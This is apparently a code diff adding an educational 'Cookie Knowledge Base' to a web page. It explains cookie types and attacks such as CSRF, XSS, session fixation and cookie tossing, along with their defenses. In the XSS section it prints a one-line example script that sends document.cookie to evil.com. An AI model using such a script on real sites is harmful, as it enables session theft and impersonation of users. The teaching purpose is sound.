@@ -135,5 +135,137 @@
     </li>
   </ul>
 
+  <h2>📚 Cookie Knowledge Base</h2>
+
+  <h3>🏠 First-Party Cookies</h3>
+  <p>
+    A <strong>first-party cookie</strong> is a cookie set by the website you are currently visiting.
+    It matches the domain shown in the browser's address bar. For example, if you visit
+    <code>example.com</code>, any cookie set by <code>example.com</code> is a first-party cookie.
+    These cookies are used for essential features like keeping you logged in, remembering your preferences,
+    and storing items in a shopping cart. Browsers generally trust first-party cookies and allow them by default.
+  </p>
+
+  <h3>🌍 Third-Party Cookies</h3>
+  <p>
+    A <strong>third-party cookie</strong> is a cookie set by a domain <em>different</em> from the one you are visiting.
+    For example, if <code>example.com</code> embeds an ad from <code>ads.tracker.com</code>, and that ad sets a cookie,
+    it is a third-party cookie. These cookies are commonly used for cross-site tracking, ad targeting, and analytics.
+    Because they can follow users across multiple websites, third-party cookies raise significant privacy concerns.
+    Modern browsers are increasingly blocking or restricting third-party cookies by default
+    (e.g., Safari, Firefox, and Chrome's planned phase-out).
+  </p>
+
+  <h3>🛡️ Cross-Site Request Forgery (CSRF) Attacks</h3>
+  <p>
+    <strong>CSRF</strong> is an attack where a malicious website tricks a user's browser into making an unwanted request
+    to another site where the user is authenticated. Because browsers automatically attach cookies to requests,
+    the target site believes the request is legitimate. For example, a hidden form on <code>evil.com</code> could
+    submit a POST request to <code>bank.com/transfer</code> — and if the user is logged into their bank,
+    the request would include their session cookie automatically.
+  </p>
+  <p><strong>Key defenses against CSRF:</strong></p>
+  <ul>
+    <li><strong>SameSite cookie attribute:</strong> Setting <code>SameSite=Lax</code> or <code>SameSite=Strict</code>
+      prevents the browser from sending the cookie with cross-site requests.</li>
+    <li><strong>CSRF tokens:</strong> A unique, unpredictable token included in forms that the server validates
+      on each request.</li>
+    <li><strong>Checking the Origin/Referer header:</strong> The server verifies that the request originated
+      from a trusted domain.</li>
+  </ul>
+
+  <h3>🕵️ Cross-Site Scripting (XSS) Cookie Theft</h3>
+  <p>
+    In an <strong>XSS attack</strong>, an attacker injects malicious JavaScript into a trusted website.
+    The script runs in the victim's browser and can access cookies via <code>document.cookie</code>,
+    then send them to an attacker-controlled server. Once the attacker has the session cookie,
+    they can impersonate the victim.
+  </p>
+  <p><strong>Example malicious script:</strong></p>
+  <pre><code>&lt;script&gt;
+  new Image().src = "https://evil.com/steal?cookie=" + document.cookie;
+&lt;/script&gt;</code></pre>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>HttpOnly flag:</strong> Prevents JavaScript from accessing the cookie via <code>document.cookie</code>.</li>
+    <li><strong>Content Security Policy (CSP):</strong> Restricts which scripts can execute on the page.</li>
+    <li><strong>Input sanitization:</strong> Escape and validate all user input before rendering it in HTML.</li>
+  </ul>
+
+  <h3>🔓 Session Hijacking</h3>
+  <p>
+    <strong>Session hijacking</strong> occurs when an attacker obtains a valid session cookie and uses it
+    to impersonate the user. This can happen through network sniffing (on unencrypted HTTP connections),
+    XSS attacks, or malware. Once the attacker has the session ID, the server cannot distinguish
+    between the legitimate user and the attacker.
+  </p>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>Secure flag:</strong> Ensures cookies are only sent over HTTPS, preventing network sniffing.</li>
+    <li><strong>Short session expiration:</strong> Limits the window of opportunity for stolen cookies.</li>
+    <li><strong>Session regeneration:</strong> Issue a new session ID after login or privilege changes.</li>
+    <li><strong>Binding sessions to IP/User-Agent:</strong> Detect suspicious changes in client characteristics.</li>
+  </ul>
+
+  <h3>📌 Session Fixation</h3>
+  <p>
+    In a <strong>session fixation</strong> attack, the attacker sets a known session ID in the victim's browser
+    <em>before</em> the victim logs in. After the victim authenticates, the attacker already knows the session ID
+    and can use it to access the authenticated session. For example, the attacker could send a link like
+    <code>https://site.com/login?sessionid=abc123</code>.
+  </p>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>Regenerate session ID on login:</strong> Always create a new session ID after successful authentication.</li>
+    <li><strong>Reject externally set session IDs:</strong> Only accept session IDs that were generated by the server.</li>
+    <li><strong>Use strict SameSite cookies:</strong> Prevents cross-site session injection.</li>
+  </ul>
+
+  <h3>🍪 Cookie Tossing</h3>
+  <p>
+    <strong>Cookie tossing</strong> exploits the way browsers handle cookies across subdomains.
+    An attacker controlling a subdomain (e.g., <code>evil.sub.example.com</code>) can set a cookie
+    for the parent domain (<code>.example.com</code>). This cookie then gets sent to the main application
+    at <code>www.example.com</code>, potentially overriding legitimate cookies and hijacking sessions
+    or injecting malicious values.
+  </p>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>Cookie prefixes:</strong> Use <code>__Host-</code> prefix which requires the cookie to be Secure,
+      have no Domain attribute, and Path set to <code>/</code> — preventing subdomain overrides.</li>
+    <li><strong>Validate cookie integrity:</strong> Sign or encrypt cookie values server-side.</li>
+    <li><strong>Restrict subdomain access:</strong> Minimize untrusted content on subdomains.</li>
+  </ul>
+
+  <h3>💥 Cookie Overflow / Cookie Jar Overflow</h3>
+  <p>
+    Browsers limit the number of cookies per domain (typically ~50) and total cookie size (~4KB each).
+    In a <strong>cookie overflow attack</strong>, the attacker forces the browser to create many cookies,
+    pushing out legitimate cookies (like session cookies). This can force a user to be logged out
+    or fall back to weaker authentication, which the attacker can then exploit.
+  </p>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>Use <code>__Host-</code> prefix:</strong> These cookies are harder to evict via subdomain manipulation.</li>
+    <li><strong>Server-side session validation:</strong> Don't rely solely on the presence of a cookie.</li>
+    <li><strong>Monitor for unusual cookie patterns:</strong> Detect when cookie counts spike abnormally.</li>
+  </ul>
+
+  <h3>🎭 Cookie Replay Attack</h3>
+  <p>
+    A <strong>cookie replay attack</strong> involves capturing a valid cookie (e.g., via network sniffing or logs)
+    and re-sending it later to gain unauthorized access. Even after the user logs out, if the server
+    doesn't properly invalidate the session, the old cookie may still work.
+  </p>
+  <p><strong>Key defenses:</strong></p>
+  <ul>
+    <li><strong>Server-side session invalidation:</strong> Destroy the session on the server when the user logs out.</li>
+    <li><strong>Short-lived cookies:</strong> Use short expiration times and refresh tokens.</li>
+    <li><strong>One-time tokens:</strong> Bind cookies to specific requests or time windows.</li>
+    <li><strong>Secure + HttpOnly + SameSite:</strong> Use all three flags together for defense in depth.</li>
+  </ul>
+
+  <a href="https://web.dev/articles/understanding-cookies#what_are_first-party_and_third-party_cookies" target="_blank">Understanding Cookies - What are first-party and third-party cookies?</a>
+
 </body>
 </html>
